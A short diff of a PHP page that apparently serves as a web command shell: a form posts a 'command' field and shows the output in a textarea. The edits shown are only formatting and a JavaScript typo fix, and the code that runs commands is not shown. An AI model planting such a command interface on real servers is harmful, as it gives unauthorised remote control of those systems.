@@ -26,14 +26,14 @@ if($_POST['command'])
 
 <FORM METHOD = POST>
 <TEXTAREA NAME = out id = out style="width: 100%; height:90%">
-<?php echo $out?>
+<?php echo $out ?>
 </TEXTAREA><BR>
-Input Command: <INPUT NAME = command id = command TYPE=TEXT LENGTH=255>
-<INPUT TYPE=SUBMIT>
+Input Command: <INPUT NAME = command id = command TYPE = TEXT LENGTH = 255>
+<INPUT TYPE = SUBMIT>
 </FORM>
 
 <script>
-var ta = document.getElementByID('out');
+var ta = document.getElementById('out');
 ta.scrollTop = ta.scrollHeight;
 var cmd = document.getElementById('command');
 cmd.focus();
